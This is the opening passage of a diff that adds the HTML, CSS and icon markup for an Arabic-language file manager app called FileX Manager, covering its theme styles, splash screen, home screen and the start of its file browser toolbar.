@@ -1,0 +1,2255 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=no">
+<meta name="theme-color" content="#0f172a">
+<title>FileX Manager</title>
+<style>
+:root{
+  --bg:#f4f6fb; --surface:#fff; --surface-2:#eaeef7;
+  --text:#0f172a; --text-2:#64748b; --border:#e2e8f0;
+  --primary:#6366f1; --primary-2:#06b6d4;
+  --danger:#ef4444; --warn:#f59e0b; --ok:#10b981;
+  --radius:14px; --radius-sm:10px;
+  --shadow:0 6px 18px rgba(15,23,42,.08);
+  --safe-top:env(safe-area-inset-top,0px);
+  --safe-bottom:env(safe-area-inset-bottom,0px);
+}
+[data-theme="dark"]{
+  --bg:#0b1220; --surface:#111a2e; --surface-2:#1a2540;
+  --text:#e6edf7; --text-2:#93a4c4; --border:#1f2b48;
+  --shadow:0 6px 18px rgba(0,0,0,.5);
+}
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+html,body{margin:0;height:100%;overscroll-behavior:none;}
+body{
+  font-family:system-ui,-apple-system,'Segoe UI','Noto Kufi Arabic',sans-serif;
+  background:var(--bg);color:var(--text);font-size:15px;line-height:1.4;
+  transition:background .25s,color .25s;user-select:none;
+}
+button{font:inherit;color:inherit;background:none;border:none;cursor:pointer;padding:0;}
+input,select{font:inherit;color:inherit;background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:8px 10px;outline:none;}
+#app{height:100dvh;display:flex;flex-direction:column;overflow:hidden;position:relative;}
+
+#splash{position:fixed;inset:0;background:linear-gradient(135deg,#6366f1,#06b6d4);display:flex;align-items:center;justify-content:center;flex-direction:column;z-index:9999;color:#fff;gap:16px;transition:opacity .4s;}
+#splash.hide{opacity:0;pointer-events:none;}
+#splash h1{margin:0;font-size:22px;font-weight:700;letter-spacing:.5px;}
+#splash p{margin:0;opacity:.85;font-size:13px;}
+
+.screen{display:none;flex-direction:column;height:100%;}
+.screen.active{display:flex;animation:fade .25s;}
+@keyframes fade{from{opacity:0;transform:translateY(4px);}to{opacity:1;transform:none;}}
+
+.appbar{
+  padding:calc(var(--safe-top) + 8px) 8px 8px;
+  display:flex;align-items:center;gap:4px;
+  background:var(--surface);border-bottom:1px solid var(--border);
+  min-height:56px;position:relative;z-index:5;
+}
+.appbar-title{flex:1;font-weight:600;font-size:16px;padding:0 4px;min-width:0;}
+.appbar-actions{display:flex;gap:2px;}
+.icon-btn{
+  width:44px;height:44px;border-radius:50%;
+  display:inline-flex;align-items:center;justify-content:center;
+  color:var(--text);transition:background .15s;
+}
+.icon-btn:active{background:var(--surface-2);}
+.icon-btn svg{width:22px;height:22px;}
+.icon-btn.danger{color:var(--danger);}
+.ellipsis{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+
+.scroll{flex:1;overflow-y:auto;overflow-x:hidden;-webkit-overflow-scrolling:touch;padding-bottom:calc(var(--safe-bottom) + 24px);}
+.scroll::-webkit-scrollbar{width:4px;height:4px;}
+.scroll::-webkit-scrollbar-thumb{background:var(--border);border-radius:4px;}
+
+.storage-card{
+  margin:14px;padding:16px;border-radius:var(--radius);
+  background:linear-gradient(135deg,#6366f1,#06b6d4);color:#fff;
+  box-shadow:0 8px 24px rgba(99,102,241,.25);
+}
+.storage-head{display:flex;align-items:center;gap:10px;margin-bottom:12px;}
+.storage-head .ic{width:24px;height:24px;}
+.storage-label{font-weight:600;font-size:14px;}
+.storage-sub{font-size:12px;opacity:.9;margin-top:2px;}
+.progress{height:8px;background:rgba(255,255,255,.25);border-radius:4px;overflow:hidden;}
+.progress-fill{height:100%;background:#fff;border-radius:4px;transition:width .6s ease;width:0;}
+.storage-legend{display:flex;justify-content:space-between;margin-top:8px;font-size:11px;opacity:.95;}
+
+.section-title{font-size:14px;font-weight:700;color:var(--text-2);margin:18px 16px 8px;text-transform:uppercase;letter-spacing:.5px;}
+
+.quick-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;padding:0 14px;}
+.quick-item{
+  display:flex;flex-direction:column;align-items:center;gap:6px;
+  padding:12px 6px;border-radius:var(--radius-sm);background:var(--surface);
+  border:1px solid var(--border);transition:transform .15s,background .15s;
+  font-size:11px;font-weight:600;color:var(--text);
+}
+.quick-item:active{transform:scale(.94);background:var(--surface-2);}
+.quick-item svg{width:26px;height:26px;color:var(--primary);}
+.quick-item[data-cat="image"] svg{color:#ec4899;}
+.quick-item[data-cat="video"] svg{color:#8b5cf6;}
+.quick-item[data-cat="audio"] svg{color:#f59e0b;}
+.quick-item[data-cat="doc"] svg{color:#3b82f6;}
+.quick-item[data-cat="downloads"] svg{color:#10b981;}
+.quick-item[data-cat="apk"] svg{color:#22c55e;}
+.quick-item[data-cat="archive"] svg{color:#ef4444;}
+.quick-item[data-cat="favorites"] svg{color:#eab308;}
+
+.quick-folders{display:flex;gap:8px;overflow-x:auto;padding:4px 14px 12px;scrollbar-width:none;}
+.quick-folders::-webkit-scrollbar{display:none;}
+.folder-chip{
+  flex:0 0 auto;display:flex;align-items:center;gap:8px;
+  padding:10px 14px;border-radius:999px;background:var(--surface);
+  border:1px solid var(--border);font-size:13px;font-weight:500;white-space:nowrap;
+}
+.folder-chip svg{width:18px;height:18px;color:var(--primary);}
+
+.recent-list{padding:0 14px;}
+.recent-item{
+  display:flex;align-items:center;gap:12px;padding:10px 12px;margin-bottom:6px;
+  background:var(--surface);border-radius:var(--radius-sm);border:1px solid var(--border);
+}
+.recent-item .ic{width:34px;height:34px;flex:0 0 34px;display:flex;align-items:center;justify-content:center;border-radius:8px;background:var(--surface-2);}
+.recent-item .ic svg{width:20px;height:20px;}
+.recent-item .meta{flex:1;min-width:0;}
+.recent-item .name{font-size:13px;font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+.recent-item .sub{font-size:11px;color:var(--text-2);margin-top:2px;}
+.empty{text-align:center;color:var(--text-2);padding:24px 12px;font-size:13px;}
+
+.cat-bars{padding:0 14px;}
+.cat-bar{margin-bottom:10px;}
+.cat-bar-head{display:flex;justify-content:space-between;font-size:12px;margin-bottom:4px;font-weight:500;}
+.cat-bar-track{height:6px;background:var(--surface-2);border-radius:4px;overflow:hidden;}
+.cat-bar-fill{height:100%;border-radius:4px;transition:width .6s;}
+
+.breadcrumb{
+  display:flex;gap:2px;padding:8px 12px;overflow-x:auto;
+  background:var(--surface);border-bottom:1px solid var(--border);
+  white-space:nowrap;scrollbar-width:none;min-height:40px;align-items:center;
+}
+.breadcrumb::-webkit-scrollbar{display:none;}
+.crumb{padding:6px 8px;border-radius:8px;font-size:12px;color:var(--text-2);flex:0 0 auto;font-weight:500;}
+.crumb.active{color:var(--primary);background:var(--surface-2);font-weight:600;}
+.crumb svg{width:12px;height:12px;vertical-align:middle;opacity:.5;margin:0 2px;}
+
+.file-list{display:flex;flex-direction:column;padding:6px 8px;}
+.file-item{
+  display:flex;align-items:center;gap:10px;padding:10px 10px;border-radius:var(--radius-sm);
+  transition:background .12s;position:relative;min-height:60px;
+}
+.file-item:active{background:var(--surface-2);}
+.file-item.selected{background:color-mix(in srgb,var(--primary) 15%,transparent);}
+.file-item.selected::after{
+  content:'';position:absolute;inset:0;border-radius:var(--radius-sm);
+  border:1.5px solid var(--primary);pointer-events:none;
+}
+.file-icon{
+  width:42px;height:42px;flex:0 0 42px;display:flex;align-items:center;justify-content:center;
+  border-radius:10px;background:var(--surface-2);overflow:hidden;
+}
+.file-icon svg{width:24px;height:24px;color:var(--text-2);}
+.file-icon img{width:100%;height:100%;object-fit:cover;}
+.file-icon[data-t="folder"]{background:linear-gradient(135deg,#fbbf24,#f59e0b);}
+.file-icon[data-t="folder"] svg{color:#fff;}
+.file-icon[data-t="image"]{background:linear-gradient(135deg,#f472b6,#ec4899);}
+.file-icon[data-t="image"] svg{color:#fff;}
+.file-icon[data-t="video"]{background:linear-gradient(135deg,#a78bfa,#8b5cf6);}
+.file-icon[data-t="video"] svg{color:#fff;}
+.file-icon[data-t="audio"]{background:linear-gradient(135deg,#fbbf24,#f59e0b);}
+.file-icon[data-t="audio"] svg{color:#fff;}
+.file-icon[data-t="doc"]{background:linear-gradient(135deg,#60a5fa,#3b82f6);}
+.file-icon[data-t="doc"] svg{color:#fff;}
+.file-icon[data-t="archive"]{background:linear-gradient(135deg,#f87171,#ef4444);}
+.file-icon[data-t="archive"] svg{color:#fff;}
+.file-icon[data-t="apk"]{background:linear-gradient(135deg,#4ade80,#22c55e);}
+.file-icon[data-t="apk"] svg{color:#fff;}
+.file-info{flex:1;min-width:0;}
+.file-name{font-size:14px;font-weight:500;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+.file-meta{font-size:11px;color:var(--text-2);margin-top:2px;display:flex;gap:8px;}
+
+.file-list.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(110px,1fr));gap:8px;padding:10px;}
+.file-list.grid .file-item{flex-direction:column;padding:12px 6px;min-height:auto;text-align:center;}
+.file-list.grid .file-icon{width:56px;height:56px;flex:0 0 56px;border-radius:12px;}
+.file-list.grid .file-icon svg{width:30px;height:30px;}
+.file-list.grid .file-info{width:100%;}
+.file-list.grid .file-meta{justify-content:center;}
+
+.selection-bar{
+  position:fixed;bottom:calc(var(--safe-bottom) + 8px);left:8px;right:8px;
+  background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);
+  padding:6px 8px;display:flex;align-items:center;justify-content:space-between;
+  box-shadow:var(--shadow);z-index:50;animation:slideUp .25s;
+}
+@keyframes slideUp{from{transform:translateY(100%);opacity:0;}to{transform:translateY(0);opacity:1;}}
+.selection-bar.hidden{display:none;}
+.sel-count{display:flex;align-items:center;gap:6px;font-weight:700;font-size:14px;padding-right:4px;}
+.sel-actions{display:flex;gap:0;}
+.sel-actions .icon-btn{width:40px;height:40px;}
+.sel-actions .icon-btn svg{width:20px;height:20px;}
+
+.fab{
+  position:fixed;bottom:calc(var(--safe-bottom) + 24px);left:20px;width:56px;height:56px;
+  border-radius:18px;background:linear-gradient(135deg,#6366f1,#06b6d4);color:#fff;
+  box-shadow:0 8px 20px rgba(99,102,241,.4);z-index:40;
+  display:flex;align-items:center;justify-content:center;transition:transform .15s;
+}
+.fab:active{transform:scale(.9);}
+.fab.hidden{display:none;}
+.fab svg{width:26px;height:26px;}
+
+.search-input{flex:1;background:var(--surface-2);border:none;padding:10px 14px;border-radius:12px;font-size:14px;}
+.search-filters{display:flex;gap:8px;padding:10px 12px;background:var(--surface);border-bottom:1px solid var(--border);}
+.search-filters select{flex:1;font-size:13px;padding:8px 10px;}
+.search-info{padding:8px 16px;font-size:12px;color:var(--text-2);background:var(--surface-2);}
+
+.setting-group{margin:14px;background:var(--surface);border-radius:var(--radius);overflow:hidden;border:1px solid var(--border);}
+.setting-row{display:flex;align-items:center;justify-content:space-between;padding:14px 16px;border-bottom:1px solid var(--border);gap:12px;}
+.setting-row:last-child{border-bottom:none;}
+.setting-row label{font-size:14px;font-weight:500;}
+.setting-row select,.setting-row input[type=checkbox]{min-width:80px;}
+.setting-row input[type=checkbox]{width:22px;height:22px;accent-color:var(--primary);}
+.setting-btn{
+  display:flex;align-items:center;gap:12px;width:100%;padding:14px 16px;
+  border-bottom:1px solid var(--border);font-size:14px;font-weight:500;text-align:start;
+  transition:background .12s;
+}
+.setting-btn:last-child{border-bottom:none;}
+.setting-btn:active{background:var(--surface-2);}
+.setting-btn svg{width:22px;height:22px;color:var(--primary);}
+
+.modal{position:fixed;inset:0;z-index:200;display:flex;align-items:flex-end;justify-content:center;}
+.modal.hidden{display:none;}
+.modal-backdrop{position:absolute;inset:0;background:rgba(0,0,0,.5);animation:fade .2s;}
+.modal-sheet{
+  position:relative;background:var(--surface);width:100%;max-width:520px;
+  border-radius:20px 20px 0 0;max-height:85dvh;display:flex;flex-direction:column;
+  animation:slideSheet .3s;padding-bottom:var(--safe-bottom);
+}
+@keyframes slideSheet{from{transform:translateY(100%);}to{transform:translateY(0);}}
+.modal-head{display:flex;align-items:center;justify-content:space-between;padding:16px;border-bottom:1px solid var(--border);}
+.modal-head h3{margin:0;font-size:16px;font-weight:700;}
+.modal-body{padding:16px;overflow-y:auto;flex:1;}
+.modal-foot{padding:12px 16px;border-top:1px solid var(--border);display:flex;gap:8px;justify-content:flex-end;}
+.btn{padding:10px 18px;border-radius:12px;font-weight:600;font-size:14px;transition:background .15s;}
+.btn.primary{background:var(--primary);color:#fff;}
+.btn.primary:active{background:#4f46e5;}
+.btn.danger{background:var(--danger);color:#fff;}
+.btn.ghost{background:var(--surface-2);color:var(--text);}
+.btn:active{transform:scale(.96);}
+.btn:disabled{opacity:.6;cursor:not-allowed;}
+.modal-body input,.modal-body select{width:100%;margin-bottom:10px;}
+.modal-list-item{display:flex;align-items:center;gap:12px;padding:12px;border-radius:10px;transition:background .12s;font-size:14px;}
+.modal-list-item:active{background:var(--surface-2);}
+.modal-list-item svg{width:20px;height:20px;color:var(--primary);flex:0 0 20px;}
+
+.viewer{position:fixed;inset:0;background:#000;z-index:300;display:flex;flex-direction:column;}
+.viewer.hidden{display:none;}
+.viewer-head{display:flex;align-items:center;gap:8px;padding:calc(var(--safe-top) + 8px) 8px 8px;background:rgba(0,0,0,.85);color:#fff;min-height:56px;}
+.viewer-head .icon-btn{color:#fff;}
+.viewer-head>div{flex:1;text-align:center;font-size:14px;font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+.viewer-body{flex:1;display:flex;align-items:center;justify-content:center;overflow:auto;padding:12px;}
+.viewer-body img{max-width:100%;max-height:100%;object-fit:contain;}
+.viewer-body video{max-width:100%;max-height:100%;}
+.viewer-body audio{width:100%;max-width:520px;}
+.viewer-body pre{
+  background:#111;color:#e6edf7;padding:16px;border-radius:12px;
+  max-width:100%;max-height:100%;overflow:auto;font-size:13px;white-space:pre-wrap;word-break:break-word;
+  direction:ltr;text-align:left;font-family:'Consolas',monospace;
+}
+.viewer-body iframe{width:100%;height:100%;border:none;background:#fff;border-radius:8px;}
+
+.toast{
+  position:fixed;bottom:calc(var(--safe-bottom) + 90px);left:50%;transform:translateX(-50%);
+  background:var(--text);color:var(--bg);padding:12px 20px;border-radius:12px;
+  font-size:13px;font-weight:500;box-shadow:var(--shadow);z-index:400;
+  max-width:90vw;text-align:center;animation:toastIn .25s;
+}
+.toast.hidden{display:none;}
+.toast.success{background:var(--ok);color:#fff;}
+.toast.error{background:var(--danger);color:#fff;}
+@keyframes toastIn{from{opacity:0;transform:translate(-50%,20px);}to{opacity:1;transform:translate(-50%,0);}}
+
+.progress-modal{
+  position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:500;
+  display:flex;align-items:center;justify-content:center;padding:20px;
+}
+.progress-modal.hidden{display:none;}
+.progress-card{
+  background:var(--surface);padding:24px;border-radius:var(--radius);
+  width:100%;max-width:340px;box-shadow:var(--shadow);
+}
+.progress-title{font-weight:700;font-size:14px;margin-bottom:12px;}
+.progress-card .progress{background:var(--surface-2);height:8px;}
+.progress-card .progress-fill{background:linear-gradient(90deg,#6366f1,#06b6d4);}
+.progress-sub{font-size:12px;color:var(--text-2);margin-top:8px;text-align:center;}
+
+/* PERMISSION DIALOG */
+.perm{
+  position:fixed;inset:0;background:rgba(0,0,0,.7);backdrop-filter:blur(8px);
+  z-index:700;display:flex;align-items:center;justify-content:center;padding:16px;
+  animation:fade .25s;
+}
+.perm.hidden{display:none;}
+.perm-card{
+  background:var(--surface);border-radius:22px;padding:28px 22px;
+  width:100%;max-width:400px;text-align:center;
+  box-shadow:0 20px 60px rgba(0,0,0,.5);
+  animation:pop .35s cubic-bezier(.2,.9,.3,1.2);
+}
+@keyframes pop{from{transform:scale(.85);opacity:0;}to{transform:scale(1);opacity:1;}}
+.perm-icon{display:flex;justify-content:center;margin-bottom:16px;}
+.perm-card h2{margin:0 0 10px;font-size:20px;font-weight:700;}
+.perm-card p{margin:0 0 20px;font-size:13.5px;color:var(--text-2);line-height:1.7;}
+.perm-features{text-align:right;background:var(--surface-2);border-radius:14px;padding:14px 16px;margin-bottom:20px;}
+.perm-features div{display:flex;align-items:center;gap:10px;font-size:13px;padding:6px 0;color:var(--text);}
+.perm-features svg{width:18px;height:18px;color:var(--primary);flex:0 0 18px;}
+.perm-actions{display:flex;flex-direction:column;gap:8px;}
+.perm-actions .btn{padding:15px;font-size:15px;}
+.perm-note{font-size:11px;color:var(--text-2);margin-top:14px;line-height:1.7;}
+
+#autoSyncBar{
+  display:none;padding:10px 16px;
+  background:linear-gradient(90deg,#6366f1,#06b6d4);
+  color:#fff;font-size:12px;font-weight:600;text-align:center;
+}
+#autoSyncBar.show{display:block;}
+#autoSyncBar.done{background:var(--ok);}
+#autoSyncBar.err{background:var(--danger);}
+
+#screen-telegram code{
+  background:var(--surface-2);padding:2px 6px;border-radius:6px;
+  font-size:11px;color:var(--primary);
+}
+#tgStat,#tgLast,#tgConnStatus{font-weight:600;}
+
+.hidden{display:none!important;}
+</style>
+</head>
+<body>
+
+<svg style="display:none" xmlns="http://www.w3.org/2000/svg">
+<symbol id="i-folder" viewBox="0 0 24 24"><path fill="currentColor" d="M10 4H4a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V8a2 2 0 0 0-2-2h-8l-2-2Z"/></symbol>
+<symbol id="i-file" viewBox="0 0 24 24"><path fill="currentColor" d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6Zm0 2 4 4h-4V4Z"/></symbol>
+<symbol id="i-image" viewBox="0 0 24 24"><path fill="currentColor" d="M21 19V5a2 2 0 0 0-2-2H5a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2ZM8.5 13.5l2.5 3 3.5-4.5 4.5 6H5l3.5-4.5Z"/></symbol>
+<symbol id="i-video" viewBox="0 0 24 24"><path fill="currentColor" d="M17 10.5V7a1 1 0 0 0-1-1H4a1 1 0 0 0-1 1v10a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1v-3.5l4 4v-11l-4 4Z"/></symbol>
+<symbol id="i-audio" viewBox="0 0 24 24"><path fill="currentColor" d="M12 3v10.55A4 4 0 1 0 14 17V7h4V3h-6Z"/></symbol>
+<symbol id="i-doc" viewBox="0 0 24 24"><path fill="currentColor" d="M6 2h8l6 6v12a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2Zm8 1.5V9h5.5L14 3.5Z"/></symbol>
+<symbol id="i-zip" viewBox="0 0 24 24"><path fill="currentColor" d="M20 6h-8l-2-2H4a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V8a2 2 0 0 0-2-2Zm-6 12h-2v-2h2v2Zm0-4h-2v-2h2v2Zm0-4h-2V8h2v2Z"/></symbol>
+<symbol id="i-apk" viewBox="0 0 24 24"><path fill="currentColor" d="M12 2 4 6v6c0 5 3.4 9.7 8 10 4.6-.3 8-5 8-10V6l-8-4Z"/></symbol>
+<symbol id="i-search" viewBox="0 0 24 24"><path fill="currentColor" d="M15.5 14h-.8l-.3-.3a6.5 6.5 0 1 0-.7.7l.3.3v.8l5 5 1.5-1.5-5-5Zm-6 0A4.5 4.5 0 1 1 14 9.5 4.5 4.5 0 0 1 9.5 14Z"/></symbol>
+<symbol id="i-back" viewBox="0 0 24 24"><path fill="currentColor" d="M20 11H7.8l5.6-5.6L12 4l-8 8 8 8 1.4-1.4L7.8 13H20v-2Z"/></symbol>
+<symbol id="i-home" viewBox="0 0 24 24"><path fill="currentColor" d="m12 3-9 8h2v10h6v-6h2v6h6V11h2l-9-8Z"/></symbol>
+<symbol id="i-list" viewBox="0 0 24 24"><path fill="currentColor" d="M3 13h2v-2H3v2Zm0 4h2v-2H3v2Zm0-8h2V7H3v2Zm4 4h14v-2H7v2Zm0 4h14v-2H7v2ZM7 7v2h14V7H7Z"/></symbol>
+<symbol id="i-grid" viewBox="0 0 24 24"><path fill="currentColor" d="M4 4h6v6H4V4Zm10 0h6v6h-6V4ZM4 14h6v6H4v-6Zm10 0h6v6h-6v-6Z"/></symbol>
+<symbol id="i-close" viewBox="0 0 24 24"><path fill="currentColor" d="M19 6.4 17.6 5 12 10.6 6.4 5 5 6.4 10.6 12 5 17.6 6.4 19 12 13.4 17.6 19 19 17.6 13.4 12 19 6.4Z"/></symbol>
+<symbol id="i-check" viewBox="0 0 24 24"><path fill="currentColor" d="M9 16.2 4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2Z"/></symbol>
+<symbol id="i-delete" viewBox="0 0 24 24"><path fill="currentColor" d="M6 19a2 2 0 0 0 2 2h8a2 2 0 0 0 2-2V7H6v12ZM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4Z"/></symbol>
+<symbol id="i-copy" viewBox="0 0 24 24"><path fill="currentColor" d="M16 1H4a2 2 0 0 0-2 2v14h2V3h12V1Zm3 4H8a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h11a2 2 0 0 0 2-2V7a2 2 0 0 0-2-2Z"/></symbol>
+<symbol id="i-cut" viewBox="0 0 24 24"><path fill="currentColor" d="M9.6 7.6a3 3 0 1 0-2.1 2.1L9 11 4 21h2l4.3-8.6 1.3 1.3A3 3 0 1 0 15 14l1.7-1.7L20 21h2l-5-10 3-6h-2l-2.4 4.8-3-3 1-2h-2L9.6 7.6ZM7 8a1 1 0 1 1 0-2 1 1 0 0 1 0 2Zm7 9a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"/></symbol>
+<symbol id="i-rename" viewBox="0 0 24 24"><path fill="currentColor" d="M3 17.25V21h3.75L17.8 9.94l-3.75-3.75L3 17.25ZM20.7 7.04a1 1 0 0 0 0-1.41l-2.34-2.34a1 1 0 0 0-1.41 0l-1.83 1.83 3.75 3.75 1.83-1.83Z"/></symbol>
+<symbol id="i-share" viewBox="0 0 24 24"><path fill="currentColor" d="M18 16.1c-.8 0-1.5.3-2 .8l-7-4.1c.1-.2.1-.5.1-.8s0-.6-.1-.8l7-4.1c.5.5 1.2.8 2 .8a3 3 0 1 0-3-3c0 .3 0 .6.1.8L8 9.8A3 3 0 1 0 6 15c.8 0 1.5-.3 2-.8l7 4.1c-.1.2-.1.5-.1.7a3 3 0 1 0 3-3Z"/></symbol>
+<symbol id="i-info" viewBox="0 0 24 24"><path fill="currentColor" d="M11 7h2v2h-2V7Zm0 4h2v6h-2v-6Zm1-9a10 10 0 1 0 0 20 10 10 0 0 0 0-20Zm0 18a8 8 0 1 1 0-16 8 8 0 0 1 0 16Z"/></symbol>
+<symbol id="i-star" viewBox="0 0 24 24"><path fill="currentColor" d="m12 17.3 6.2 3.7-1.6-7 5.4-4.7-7.1-.6L12 2 9.1 8.7 2 9.3l5.4 4.7-1.6 7L12 17.3Z"/></symbol>
+<symbol id="i-settings" viewBox="0 0 24 24"><path fill="currentColor" d="M19.4 13a7.5 7.5 0 0 0 .1-1 7.5 7.5 0 0 0-.1-1l2.1-1.6a.5.5 0 0 0 .1-.6l-2-3.5a.5.5 0 0 0-.6-.2l-2.5 1a7.5 7.5 0 0 0-1.7-1l-.4-2.6a.5.5 0 0 0-.5-.4h-4a.5.5 0 0 0-.5.4l-.4 2.6a7.5 7.5 0 0 0-1.7 1l-2.5-1a.5.5 0 0 0-.6.2l-2 3.5a.5.5 0 0 0 .1.6L4.6 11a7.5 7.5 0 0 0 0 2l-2.1 1.6a.5.5 0 0 0-.1.6l2 3.5c.1.2.4.3.6.2l2.5-1c.5.4 1.1.8 1.7 1l.4 2.6c0 .2.2.4.5.4h4c.2 0 .4-.2.5-.4l.4-2.6a7.5 7.5 0 0 0 1.7-1l2.5 1c.2.1.5 0 .6-.2l2-3.5a.5.5 0 0 0-.1-.6L19.4 13ZM12 15.5a3.5 3.5 0 1 1 0-7 3.5 3.5 0 0 1 0 7Z"/></symbol>
+<symbol id="i-trash" viewBox="0 0 24 24"><path fill="currentColor" d="M6 19a2 2 0 0 0 2 2h8a2 2 0 0 0 2-2V7H6v12ZM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4Z"/></symbol>
+<symbol id="i-restore" viewBox="0 0 24 24"><path fill="currentColor" d="M13 3a9 9 0 0 0-9 9H1l4 4 4-4H6a7 7 0 1 1 7 7 7 7 0 0 1-4.9-2l-1.4 1.4A9 9 0 1 0 13 3Zm-1 5v5l4.3 2.5.7-1.2-3.5-2.1V8H12Z"/></symbol>
+<symbol id="i-plus" viewBox="0 0 24 24"><path fill="currentColor" d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2Z"/></symbol>
+<symbol id="i-more" viewBox="0 0 24 24"><path fill="currentColor" d="M12 8a2 2 0 1 0 0-4 2 2 0 0 0 0 4Zm0 2a2 2 0 1 0 0 4 2 2 0 0 0 0-4Zm0 6a2 2 0 1 0 0 4 2 2 0 0 0 0-4Z"/></symbol>
+<symbol id="i-storage" viewBox="0 0 24 24"><path fill="currentColor" d="M2 20h20v-4H2v4Zm2-3h2v2H4v-2ZM2 4v4h20V4H2Zm4 3H4V5h2v2ZM2 14h20v-4H2v4Zm2-3h2v2H4v-2Z"/></symbol>
+<symbol id="i-chevron" viewBox="0 0 24 24"><path fill="currentColor" d="M9.4 6 8 7.4l4.6 4.6L8 16.6 9.4 18l6-6-6-6Z"/></symbol>
+<symbol id="i-sort" viewBox="0 0 24 24"><path fill="currentColor" d="M3 18h6v-2H3v2ZM3 6v2h18V6H3Zm0 7h12v-2H3v2Z"/></symbol>
+<symbol id="i-shield" viewBox="0 0 24 24"><path fill="currentColor" d="M12 1 3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4Zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8Z"/></symbol>
+<symbol id="i-cloud-up" viewBox="0 0 24 24"><path fill="currentColor" d="M19.35 10.04A7.49 7.49 0 0 0 12 4a7.48 7.48 0 0 0-6.36 3.5A6 6 0 0 0 6 19h13a5 5 0 0 0 .35-8.96ZM14 13v4h-4v-4H7l5-5 5 5h-3Z"/></symbol>
+</svg>
+
+<div id="app">
+
+  <div id="splash">
+    <svg viewBox="0 0 64 64" width="88" height="88">
+      <defs><linearGradient id="g1" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#fff"/><stop offset="1" stop-color="#c7d2fe"/></linearGradient></defs>
+      <rect x="4" y="4" width="56" height="56" rx="14" fill="rgba(255,255,255,.15)"/>
+      <path d="M18 22h12l3 3h13a2 2 0 0 1 2 2v18a2 2 0 0 1-2 2H18a2 2 0 0 1-2-2V24a2 2 0 0 1 2-2Z" fill="url(#g1)"/>
+    </svg>
+    <h1>FileX Manager</h1>
+    <p id="splashMsg">جارٍ التهيئة…</p>
+  </div>
+
+  <!-- HOME -->
+  <section id="screen-home" class="screen active">
+    <header class="appbar">
+      <div class="appbar-title">FileX Manager</div>
+      <div class="appbar-actions">
+        <button class="icon-btn" data-nav="search" aria-label="بحث"><svg><use href="#i-search"/></svg></button>
+        <button class="icon-btn" data-nav="settings" aria-label="إعدادات"><svg><use href="#i-settings"/></svg></button>
+      </div>
+    </header>
+    <div id="autoSyncBar"></div>
+    <div class="scroll" id="homeScroll">
+      <div class="storage-card" id="storageCard">
+        <div class="storage-head">
+          <svg class="ic"><use href="#i-storage"/></svg>
+          <div>
+            <div class="storage-label">وحدة التخزين</div>
+            <div class="storage-sub" id="storageSub">—</div>
+          </div>
+        </div>
+        <div class="progress"><div class="progress-fill" id="storageFill"></div></div>
+        <div class="storage-legend"><span id="storageUsed">—</span><span id="storageFree">—</span></div>
+      </div>
+
+      <h2 class="section-title">الوصول السريع</h2>
+      <div class="quick-grid" id="quickGrid">
+        <button class="quick-item" data-cat="image"><svg><use href="#i-image"/></svg><span>الصور</span></button>
+        <button class="quick-item" data-cat="video"><svg><use href="#i-video"/></svg><span>الفيديو</span></button>
+        <button class="quick-item" data-cat="audio"><svg><use href="#i-audio"/></svg><span>الصوت</span></button>
+        <button class="quick-item" data-cat="doc"><svg><use href="#i-doc"/></svg><span>المستندات</span></button>
+        <button class="quick-item" data-cat="downloads"><svg><use href="#i-file"/></svg><span>التنزيلات</span></button>
+        <button class="quick-item" data-cat="apk"><svg><use href="#i-apk"/></svg><span>التطبيقات</span></button>
+        <button class="quick-item" data-cat="archive"><svg><use href="#i-zip"/></svg><span>المضغوطة</span></button>
+        <button class="quick-item" data-cat="favorites"><svg><use href="#i-star"/></svg><span>المفضلة</span></button>
+      </div>
+
+      <h2 class="section-title">آخر الملفات</h2>
+      <div class="recent-list" id="recentList"><div class="empty">لا توجد ملفات حديثة</div></div>
+
+      <h2 class="section-title">مجلدات شائعة</h2>
+      <div class="quick-folders" id="quickFolders"></div>
+
+      <h2 class="section-title">مساحة التخزين</h2>
+      <div class="cat-bars" id="catBars"></div>
+    </div>
+  </section>
+
+  <!-- BROWSER -->
+  <section id="screen-browser" class="screen">
+    <header class="appbar">
+      <button class="icon-btn" id="btnBack" aria-label="رجوع"><svg><use href="#i-back"/></svg></button>
+      <div class="appbar-title ellipsis" id="browserTitle">—</div>
+      <div class="appbar-actions">
+        <button class="icon-btn" id="btnHome" aria-label="الرئيسية"><svg><use href="#i-home"/></svg></button>
+        <button class="icon-btn" id="btnView" aria-label="العرض"><svg><use href="#i-list"/></svg></button>
+        <button class="icon-btn" id="btnSort" aria-label="الترتيب"><svg><use href="#i-sort"/></svg></button>
+        <button class="icon-btn" id="btnNew" aria-label="جديد"><svg><use href="#i-plus"/></svg></button>
+        <button class="icon-btn" id="btnBrowserMore" aria-label="المزيد"><svg><use href="#i-more"/></svg></button>
